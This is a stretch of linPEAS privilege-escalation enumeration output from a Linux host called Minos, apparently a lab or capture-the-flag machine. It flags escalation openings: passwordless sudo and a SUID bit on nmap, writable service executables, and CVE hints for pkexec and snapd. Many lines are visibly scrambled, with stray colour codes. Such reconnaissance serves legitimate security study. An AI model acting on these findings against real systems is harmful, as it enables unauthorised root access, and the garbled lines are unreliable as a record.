root       226  0.0  0.1  72300  3648 ?        Ss   15:50   0:00 /usr/sbin/sshd -D

╔══════════╣ Binary processes permissions (non 'root root' and not belonging to current user)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes

╔══════════╣ Files opened by processes belonging to other users
user processes informationcause of the lack of privileges to read other 
COMMAND     PID   TID            USER   FD      TYPE             DEVICE SIZE/OFF   NODE NAME

╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory
gdm-password Not Found
gnome-keyring-daemon Not Found
lightdm Not Found
vsftpd Not Found
apache2 Not Found
sshd Not Found

╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs
/usr/bin/crontab
incrontab Not Found
-rw-r--r-- 1 root root    722 Nov 16  2017 /etc/crontab

/etc/cron.d:
total 11
 2020 .r-x  2 root root   5 Jul 29 
drwxr-xr-x 90 root root 179 Aug 20  2020 ..
-rw-r--r--  1 root root 102 Nov 16  2017 .placeholder
-rw-r--r--  1 root root 589 Jan 14  2020 mdadm
m29  2020 popularity-contestJul 

/etc/cron.daily:
total 25
drwxr-xr-x  2 root root   15 Aug 20  2020 .
drwxr-xr-x 90 root root  179 Aug 20  2020 ..
.placeholder1 root root  102 Nov 16  2017 
-rwxr-xr-x  1 root root  376 Nov 11  2019 apport
-rwxr-xr-x  1 root root 1478 Apr 20  2018 apt-compat
-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils
1;32m2017 dpkgroot root 1176 Nov  2  
-rwxr-xr-x  1 root root  372 Aug 21  2017 logrotate
-rwxr-xr-x  1 root root 1065 Apr  7  2018 man-db
-rwxr-xr-x  1 root root  539 Jan 14  2020 mdadm
[1;32m 1  2018 mlocatet  538 Mar 
-rwxr-xr-x  1 root root  249 Jan 25  2018 passwd
-rwxr-xr-x  1 root root 3477 Feb 21  2018 popularity-contest
2m-x  1 root root  246 Mar 21  2018 ubuntu-advantage-tools
-rwxr-xr-x  1 root root  214 Nov 12  2018 update-notifier-common

/etc/cron.hourly:
total 8
drwxr-xr-x  2 root root   3 Jul 29  2020 .
32m root 179 Aug 20  2020 ..
mot root 102 Nov 16  2017 .placeholder

/etc/cron.monthly:
total 8
drwxr-xr-x  2 root root   3 Jul 29  2020 .
drwxr-xr-x 90 root root 179 Aug 20  2020 ..
2mNov 16  2017 .placeholder 

/etc/cron.weekly:
total 11
drwxr-xr-x  2 root root   5 Jul 29  2020 .
drwxr-xr-x 90 root root 179 Aug 20  2020 ..
 .placeholder root root 102 Nov 16  2017
-rwxr-xr-x  1 root root 723 Apr  7  2018 man-db
-rwxr-xr-x  1 root root 211 Nov 12  2018 update-notifier-common

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services
stem/flaskserver.service is calling this writable executable: /home/minos/
/etc/systemd/system/multi-user.target.wants/flaskserver.service is calling this writable executable: /home/minos/
You can't write on systemd PATH

╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers
NEXT                         LEFT     LAST                         PASSED       UNIT                         ACTIVATES
Mon 2023-07-03 02:09:08 UTC  6h left  Sun 2023-07-02 15:50:33 UTC  3h 27min ago motd-news.timer              motd-news.service
Mon 2023-07-03 04:55:57 UTC  9h left  Sun 2023-07-02 15:50:33 UTC  3h 27min ago apt-daily.timer              apt-daily.service
Mon 2023-07-03 06:08:18 UTC  10h left Sun 2023-07-02 15:50:33 UTC  3h 27min ago apt-daily-upgrade.timer      apt-daily-upgrade.service
Mon 2023-07-03 16:05:44 UTC  20h left Sun 2023-07-02 16:05:44 UTC  3h 12min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
n/a                          n/a      n/a                          n/a          fstrim.timer                 fstrim.service
n/a                          n/a      n/a                          n/a          snapd.snap-repair.timer      snapd.snap-repair.service
adahead-stop.service         n/a      n/a                          n/a          ureadahead-stop.timer        ure

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers

╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets
/etc/systemd/system/sockets.target.wants/uuidd.socket is calling this writable listener: /run/uuidd/request
/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/lib/systemd/system/uuidd.socket is calling this writable listener: /run/uuidd/request

╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets
/dev/lxd/sock
  └─(Read Write)
/run/acpid.socket
  └─(Read Write)
/run/apport.socket
/run/dbus/system_bus_socket
  └─(Read Write)
/run/lvm/lvmetad.socket
/run/lvm/lvmpolld.socket
/run/snapd-snap.socket
  └─(Read Write)
/run/snapd.socket
  └─(Read Write)
/run/systemd/journal/dev-log
  └─(Read Write)
/run/systemd/journal/socket
  └─(Read Write)
/run/systemd/journal/stdout
  └─(Read Write)
/run/systemd/journal/syslog
  └─(Read Write)
/run/systemd/notify
  └─(Read Write)
/run/systemd/private
  └─(Read Write)
/run/udev/control
/run/uuidd/request
  └─(Read Write)
/var/lib/lxd/unix.socket
/var/run/dbus/system_bus_socket
  └─(Read Write)

╔══════════╣ D-Bus config files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus
m.d/dnsmasq.conf (        <policy user="dnsmasq">)te

╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus
NAME                                 PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION        
:1.0                                 173 systemd-network systemd-network  :1.0          systemd-networkd.service  -          -                  
:1.1                                 175 systemd-resolve systemd-resolve  :1.1          systemd-resolved.service  -          -                  
:1.2                                   1 systemd         root             :1.2          init.scope                -          -                  
:1.3                                 203 accounts-daemon[0m root             :1.3          accounts-daemon.service   -          -                  
:1.35                              32112 busctl          minos            :1.35         flaskserver.service       -          -                  
:1.4                                 196 systemd-logind  root             :1.4          systemd-logind.service    -          -                  
 root             :1.5          polkit.service            -          -                  
:1.7                                 202 networkd-dispat root             :1.7          networkd-dispatcher.se…ce -          -                  
:1.8                                 217 unattended-upgr root             :1.8          unattended-upgrades.se…ce -          -                  
com.ubuntu.LanguageSelector            - -               -                (activatable) -                         -         
com.ubuntu.SoftwareProperties          - -               -                (activatable) -                         -         
io.netplan.Netplan                     - -               -                (activatable) -                         -         
org.freedesktop.Accounts             203 accounts-daemon[0m root             :1.3          accounts-daemon.service   -          -                  
org.freedesktop.DBus                   1 systemd         root             -             init.scope                -          -                  
org.freedesktop.PolicyKit1           222 polkitd         root             :1.5          polkit.service            -          -                  
org.freedesktop.hostname1              - -               -                (activatable) -                         -         
org.freedesktop.locale1                - -               -                (activatable) -                         -         
org.freedesktop.login1               196 systemd-logind  root             :1.4          systemd-logind.service    -          -                  
org.freedesktop.network1             173 systemd-network systemd-network  :1.0          systemd-networkd.service  -          -                  
org.freedesktop.resolve1             175 systemd-resolve systemd-resolve  :1.1          systemd-resolved.service  -          -                  
org.freedesktop.systemd1               1 systemd         root             :1.2          init.scope                -          -                  
org.freedesktop.timedate1              - -               -                (activatable) -                         -         


                              ╔═════════════════════╗
══════════════════════════════╣ Network Information ╠══════════════════════════════
                              ╚═════════════════════╝
╔══════════╣ Hostname, hosts and DNS
Minos
127.0.0.1 localhost

::1 ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
ff02::3 ip6-allhosts

nameserver 127.0.0.53
options edns0
search lxd
lxd

╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information
link-local 169.254.0.0
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.71.235.7  netmask 255.255.255.0  broadcast 10.71.235.255
        inet6 fe80::216:3eff:fe8a:139  prefixlen 64  scopeid 0x20<link>
        inet6 fd42:a113:181b:47f:216:3eff:fe8a:139  prefixlen 64  scopeid 0x0<global>
        ether 00:16:3e:8a:01:39  txqueuelen 1000  (Ethernet)
        RX packets 1343  bytes 936443 (936.4 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1003  bytes 195153 (195.1 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 3352547  bytes 259139377 (259.1 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 3352547  bytes 259139377 (259.1 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      212/python          
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   

╔══════════╣ Can I sniff with tcpdump?
No



                              ╔═══════════════════╗
═══════════════════════════════╣ Users Information ╠═══════════════════════════════
                               ╚═══════════════════╝
╔══════════╣ My user
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users
uid=1001(minos) gid=1001(minos) groups=1001(minos)

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg
netpgpkeys Not Found
netpgp Not Found

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
Matching Defaults entries for minos on Minos:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User minos may run the following commands on Minos:
    (root) NOPASSWD: /usr/bin/nmap

╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens
ptrace protection is enabled (1)
gdb wasn't found in PATH, this might still be vulnerable but linpeas won't be able to check it

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2

[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

═══════╣ Superusers
root:x:0:0:root:/root:/bin/bash

╔══════════╣ Users with console
minos:x:1001:1001:,,,:/home/minos:/bin/bash
root:x:0:0:root:/root:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=1001(minos) gid=1001(minos) groups=1001(minos)
uid=101(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
uid=102(syslog) gid=106(syslog) groups=106(syslog),4(adm)
uid=103(messagebus) gid=107(messagebus) groups=107(messagebus)
uid=104(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=105(lxd) gid=65534(nogroup) groups=65534(nogroup)
uid=106(uuidd) gid=110(uuidd) groups=110(uuidd)
uid=107(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
uid=108(landscape) gid=112(landscape) groups=112(landscape)
uid=109(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=110(pollinate) gid=1(daemon[0m) groups=1(daemon[0m)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
m) groups=33(www-data)3(www-data
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
)id=41(gnats) gid=41(gnats) groups=41(gnats
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)

╔══════════╣ Login now
 19:18:10 up  3:27,  0 users,  load average: 0.10, 0.04, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

╔══════════╣ Last logons
reboot   system boot  Sun Jul  2 15:50:13 2023   still running                         0.0.0.0
reboot   system boot  Thu Aug 20 14:52:40 2020 - Thu Aug 20 14:55:43 2020  (00:03)     0.0.0.0

wtmp begins Thu Aug 20 14:52:40 2020

╔══════════╣ Last time logon each user
Username         Port     From             Latest

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)

╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!



                             ╔══════════════════════╗
═════════════════════════════╣ Software Information ╠═════════════════════════════
                             ╚══════════════════════╝
╔══════════╣ Useful software
/usr/bin/base64
/usr/bin/curl
/usr/bin/g++
/usr/bin/gcc
/usr/bin/lxc
/usr/bin/make
/bin/nc
/usr/bin/ncat
/bin/netcat
/usr/bin/nmap
/usr/bin/perl
/bin/ping
/usr/bin/python
/usr/bin/python2
/usr/bin/python2.7
/usr/bin/python3
/usr/bin/python3.6
/usr/bin/sudo
/usr/bin/wget

s══════════╣ Installed Compiler
ii  g++                            4:7.4.0-1ubuntu2.3                  amd64        GNU C++ compiler
ii  g++-7                          7.5.0-3ubuntu1~18.04                amd64        GNU C++ compiler
ii  gcc                            4:7.4.0-1ubuntu2.3                  amd64        GNU C compiler
ii  gcc-7                          7.5.0-3ubuntu1~18.04                amd64        GNU C compiler
/usr/bin/gcc

╔══════════╣ Searching mysql credentials and exec

╔══════════╣ Analyzing Rsync Files (limit 70)
-rw-r--r-- 1 root root 1044 Feb 14  2020 /usr/share/doc/rsync/examples/rsyncd.conf
[ftp]
	comment = public archive
	path = /var/www/pub
	use chroot = yes
	lock file = /var/lock/rsyncd
	read only = yes
	list = yes
	uid = nobody
	gid = nogroup
	strict modes = yes
	ignore errors = no
	ignore nonreadable = yes
	transfer logging = no
	timeout = 600
	refuse options = checksum dry-run
	dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz


╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'
/ldap-xr-x 2 root root 3 Jul 29  2020 /etc


╔══════════╣ Searching ssl/ssh files
╔══════════╣ Analyzing SSH Files (limit 70)


-rw-r--r-- 1 minos minos 444 Aug  4  2020 /home/minos/.ssh/known_hosts
|1|kCPfpUuwUWs9TPNxBAoNx+DC0jI=|Gq93n+6YSFU7bdTbjOQk/qSgYz0= ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEE4dTpUgFM9GZvckN8/RQFwHQgYE1HL3TK7OlvV3BlmoPyrC4WB9Ib3BR45Os22jStHYr/tWPh/4IWc3td7DRw=
|1|PZPBF2IGn/hr7v6uZCduGH4OfDE=|PrkK9oac5PjihqdS0ul0LgWeYro= ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEE4dTpUgFM9GZvckN8/RQFwHQgYE1HL3TK7OlvV3BlmoPyrC4WB9Ib3BR45Os22jStHYr/tWPh/4IWc3td7DRw=



Port 22
ListenAddress 0.0.0.0
PermitRootLogin yes
PasswordAuthentication yes
ChallengeResponseAuthentication no
UsePAM yes
══╣ Some certificates were found (out limited):
/etc/pollinate/entropy.ubuntu.com.pem
25937PSTORAGE_CERTSBIN


/usr/share/openssh/sshd_config
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem	sftp	/usr/lib/openssh/sftp-server

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow


Searching inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 24 Jul 29  2020 /etc/pam.d
-rw-r--r-- 1 root root 2133 Mar  4  2019 /etc/pam.d/sshd




╔══════════╣ Searching tmux sessions
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-shell-sessions
tmux 2.6


/tmp/tmux-1001
╔══════════╣ Analyzing Cloud Init Files (limit 70)
-rw-r--r-- 1 root root 3517 Jun  3  2020 /etc/cloud/cloud.cfg
     lock_passwd: True

lyzing Keyring Files (limit 70)
drwxr-xr-x 3 root root 5 Aug  3  2020 /usr/lib/python2.7/dist-packages/keyrings
drwxr-xr-x 2 root root 10 Jul 29  2020 /usr/share/keyrings




╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd
passwd file: /etc/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg
netpgpkeys Not Found
netpgp Not Found

-rw-r--r-- 1 root root 2796 Sep 17  2018 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-archive.gpg
-rw-r--r-- 1 root root 2794 Sep 17  2018 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-cdimage.gpg
-rw-r--r-- 1 root root 1733 Sep 17  2018 /etc/apt/trusted.gpg.d/ubuntu-keyring-2018-archive.gpg
-rw-r--r-- 1 root root 3267 Jan 10  2019 /usr/share/gnupg/distsigkey.gpg
-rw-r--r-- 1 root root 7399 Sep 17  2018 /usr/share/keyrings/ubuntu-archive-keyring.gpg
oved-keys.gpgroot root 6713 Oct 27  2016 /usr/share/keyrings/ubuntu-archive-rem
-rw-r--r-- 1 root root 4097 Feb  6  2018 /usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 0 Jan 17  2018 /usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
-rw-r--r-- 1 root root 2253 Mar 21  2018 /usr/share/keyrings/ubuntu-esm-keyring.gpg
-rw-r--r-- 1 root root 1139 Mar 21  2018 /usr/share/keyrings/ubuntu-fips-keyring.gpg
-rw-r--r-- 1 root root 1139 Mar 21  2018 /usr/share/keyrings/ubuntu-fips-updates-keyring.gpg
-rw-r--r-- 1 root root 1227 May 27  2010 /usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 2867 Feb 22  2018 /usr/share/popularity-contest/debian-popcon.gpg

drwx------ 3 minos minos 9 Jul  2 19:18 /home/minos/.gnupg

╔══════════╣ Analyzing Cache Vi Files (limit 70)

-rw------- 1 minos minos 7005 Aug 20  2020 /home/minos/.viminfo


╔══════════╣ Analyzing Postfix Files (limit 70)
-rw-r--r-- 1 root root 675 Apr  2  2018 /usr/share/bash-completion/completions/postfix


╔══════════╣ Analyzing Bind Files (limit 70)
-rw-r--r-- 1 root root 856 Apr  2  2018 /usr/share/bash-completion/completions/bind
-rw-r--r-- 1 root root 856 Apr  2  2018 /usr/share/bash-completion/completions/bind



╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3771 Apr  4  2018 /etc/skel/.bashrc
[0m-r--r-- 1 minos minos 3771 Aug  3  2020 /home/minos/.bashrc





-rw-r--r-- 1 root root 807 Apr  4  2018 /etc/skel/.profile
-rw-r--r-- 1 minos minos 807 Aug  3  2020 /home/minos/.profile






                               ╔═══════════════════╗
═══════════════════════════════╣ Interesting Files ╠═══════════════════════════════
                               ╚═══════════════════╝
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
-rwsr-xr-x 1 root root 31K Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root 27K Mar  5  2020 /bin/umount  --->  BSD/Linux(08-1996)

-rwsr-xr-x 1 root root 43K Mar  5  2020 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 63K Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root root 59K Mar 22  2019 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 19K Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-sr-x 1 daemon daemon 51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 37K Mar 22  2019 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 22K Mar 27  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
-rwsr-xr-x 1 root root 40K Mar 22  2019 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 2.9M Apr 16  2018 /usr/bin/nmap
-rwsr-xr-x 1 root root 75K Mar 22  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 44K Mar 22  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root 146K Jan 31  2020 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 75K Mar 22  2019 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 37K Mar 22  2019 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 111K Jul 10  2020 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)

-rwsr-xr-x 1 root root 99K Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 14K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 427K Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device

╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
-rwxr-sr-x 1 root shadow 34K Feb 27  2019 /sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 34K Feb 27  2019 /sbin/unix_chkpwd
-rwsr-sr-x 1 daemon daemon 51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwxr-sr-x 1 root tty 14K Jan 17  2018 /usr/bin/bsd-write
-rwxr-sr-x 1 root ssh 355K Mar  4  2019 /usr/bin/ssh-agent
-rwxr-sr-x 1 root crontab 39K Nov 16  2017 /usr/bin/crontab
-rwxr-sr-x 1 root mlocate 43K Mar  1  2018 /usr/bin/mlocate
-rwxr-sr-x 1 root shadow 23K Mar 22  2019 /usr/bin/expiry
-rwxr-sr-x 1 root tty 31K Mar  5  2020 /usr/bin/wall
-rwxr-sr-x 1 root shadow 71K Mar 22  2019 /usr/bin/chage
-rwxr-sr-x 1 root utmp 10K Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld-so
/etc/ld.so.conf
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/fakeroot-x86_64-linux-gnu.conf
/usr/lib/x86_64-linux-gnu/libfakeroot
  /etc/ld.so.conf.d/libc.conf
/usr/local/lib
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
/usr/local/lib/x86_64-linux-gnu
/lib/x86_64-linux-gnu
/usr/lib/x86_64-linux-gnu

╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities
Current env capabilities:
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+i
Current proc capabilities:
CapInh:	0000003fffffffff
CapPrm:	0000000000000000
CapEff:	0000000000000000
CapBnd:	0000003fffffffff
CapAmb:	0000000000000000

Parent Shell capabilities:
0x0000000000000000=

Files with capabilities (limited to 50):
/usr/bin/mtr-packet = cap_net_raw+ep

╔══════════╣ Users with capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities

╔══════════╣ AppArmor binary profiles
-rw-r--r-- 1 root root  3194 Mar 26  2018 sbin.dhclient
-rw-r--r-- 1 root root   125 Nov 23  2018 usr.bin.lxc-start
-rw-r--r-- 1 root root  2857 Apr  7  2018 usr.bin.man
-rw-r--r-- 1 root root 26245 Jul 10  2020 usr.lib.snapd.snap-confine.real
-rw-r--r-- 1 root root  1550 Apr 24  2018 usr.sbin.rsyslogd
-rw-r--r-- 1 root root  1353 Mar 31  2018 usr.sbin.tcpdump

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls
files with acls in searched folders Not Found

╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path
/usr/bin/gettext.sh

╔══════════╣ Executable files potentially added by user (limit 70)
2023-07-02+19:18:21.3726704860 /var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/systemd-logind.service/cgroup.event_control
2023-07-02+19:18:21.3698482030 /var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/system-getty.slice/cgroup.event_control
2023-07-02+19:18:21.3671211150 /var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/dbus.service/cgroup.event_control
2023-07-02+19:18:21.3643126060 /var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/systemd-resolved.service/cgroup.event_control
2023-07-02+19:18:21.3615096090 /var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/snapd.socket/cgroup.event_control
2023-07-02+19:18:21.3587787930 /var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/console-getty.service/cgroup.event_control
2023-07-02+19:18:21.3559627860 /var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/rsyslog.service/cgroup.event_control
2023-07-02+19:18:21.3531758880 /var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/ssh.service/cgroup.event_control
2023-07-02+19:18:21.3504260910 /var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/unattended-upgrades.service/cgroup.event_control
2023-07-02+19:18:21.3476033170 /var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/lxd.socket/cgroup.event_control
2023-07-02+19:18:21.3448128100 /var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/atd.service/cgroup.event_control
2023-07-02+19:18:21.3420063780 /var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/systemd-journald.service/cgroup.event_control
2023-07-02+19:18:21.3392748340 /var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/accounts-daemon.service/cgroup.event_control
2023-07-02+19:18:21.3363657440 /var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/networkd-dispatcher.service/cgroup.event_control
2023-07-02+19:18:21.3335710650 /var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/flaskserver.service/cgroup.event_control
2023-07-02+19:18:21.3308439900 /var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/polkit.service/cgroup.event_control
/cgroup/memory/lxc/Minos/system.slice/sys-fs-fuse-connections.mount/cgroup.event_control
